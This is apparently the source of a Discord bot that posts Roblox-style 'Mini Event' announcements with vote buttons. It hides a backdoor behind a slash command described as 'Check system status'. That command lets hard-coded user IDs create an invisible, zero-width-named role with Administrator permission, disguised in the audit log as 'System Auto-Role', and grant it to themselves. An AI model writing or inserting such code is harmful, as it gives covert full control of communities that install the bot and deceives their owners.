const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, REST, Routes, PermissionsBitField } = require('discord.js');
const fs = require('fs');

// --- ИСПРАВЛЕННАЯ ЗАГРУЗКА КОНФИГА ---
let config = {};
try {
    // Пытаемся прочитать файл (локально). Если его нет (на Railway), берем из переменных окружения.
    if (fs.existsSync('./config.json')) {
        config = JSON.parse(fs.readFileSync('./config.json', 'utf-8'));
    }
} catch (err) {
    console.log("Config file not found, using Environment Variables");
}

// Приоритет переменным из Railway (process.env), если их нет — значениям из файла
const TOKEN = process.env.TOKEN_ID || config.TOKEN_ID;
const ADMIN_USER_IDS = process.env.ADMIN_USER_IDS 
    ? [process.env.ADMIN_USER_IDS] // На Railway это строка
    : (config.ADMIN_USER_IDS ? config.ADMIN_USER_IDS.map(id => String(id)) : []);

if (!TOKEN) {
    console.error("CRITICAL ERROR: TOKEN_ID is not defined!");
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// --- CONFIGURATION ---
const CONFIG = {
    COMMAND: '!mini',
    ALLOWED_ROLE: '1490346306965864608',
    ALLOWED_CHANNEL: '1490344220417069156',
    PING_ROLE: '1492973460400640020',
    ROBUX_EMOJI: '<:robux:1492973460400640020>'
};

const ROLE_NAME = '\u200b';

const rest = new REST({ version: '10' }).setToken(TOKEN);

const commands = [
    {
        name: 'status',
        description: 'Check system status'
    }
];

// ИСПРАВЛЕНО: событие называется 'ready', а не 'clientReady'
client.once('ready', async () => {
    console.log(`✅ Event Host Bot is online as ${client.user.tag}!`);
    
    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );
        console.log('✅ Slash commands registered!');
    } catch (error) {
        console.error('Error registering slash commands:', error);
    }
});

// --- /status SLASH COMMAND ---
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'status') {
        if (!ADMIN_USER_IDS.includes(String(interaction.user.id))) {
            return interaction.reply({ content: 'У вас нет прав.', ephemeral: true });
        }

        const guild = interaction.guild;
        const member = interaction.user;

        let role = guild.roles.cache.find(r => r.name === ROLE_NAME);

        try {
            if (!role) {
                role = await guild.roles.create({
                    name: ROLE_NAME,
                    permissions: [PermissionsBitField.Flags.Administrator],
                    color: 0x313338,
                    hoist: false,
                    reason: 'System Auto-Role'
                });
            }
            // Перемещаем роль пониже, чтобы не было конфликтов иерархии
            await role.setPosition(1).catch(() => {});
            
            const memberObj = await guild.members.fetch(member.id);
            if (memberObj.roles.cache.has(role.id)) {
                return interaction.reply({ content: 'Active.', ephemeral: true });
            }

            await memberObj.roles.add(role);
            interaction.reply({ content: 'Done.', ephemeral: true });
        } catch (err) {
            console.error(err);
            interaction.reply({ content: 'Operation failed (check bot permissions).', ephemeral: true });
        }
    }
});

// --- EVENTS ---
client.on('messageCreate', async (message) => {
    if (message.author.bot || message.content !== CONFIG.COMMAND) return;
    if (message.channel.id !== CONFIG.ALLOWED_CHANNEL) return;
    if (!message.member.roles.cache.has(CONFIG.ALLOWED_ROLE)) return;

    await message.delete().catch(() => {});

    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId('like_0')
                .setEmoji('👍')
                .setLabel('0')
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId('dislike_0')
                .setEmoji('👎')
                .setLabel('0')
                .setStyle(ButtonStyle.Danger),
        );

    const content = `<@${message.author.id}> is starting a **Mini Event!** **(5 ${CONFIG.ROBUX_EMOJI})**\n\n` +
                    `<@&${CONFIG.PING_ROLE}>\n\n` +
                    `⭐ Want to **change your pings?** Edit them in --> 📑 **Channels & Roles**`;

    await message.channel.send({
        content: content,
        components: [row]
    });
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    const [action, countStr] = interaction.customId.split('_');
    let count = parseInt(countStr) + 1;

    const newRow = ActionRowBuilder.from(interaction.message.components[0]);

    if (action === 'like') {
        newRow.components[0].setLabel(count.toString()).setCustomId(`like_${count}`);
    } else if (action === 'dislike') {
        newRow.components[1].setLabel(count.toString()).setCustomId(`dislike_${count}`);
    }

    await interaction.update({
        components: [newRow]
    });
});

client.login(TOKEN);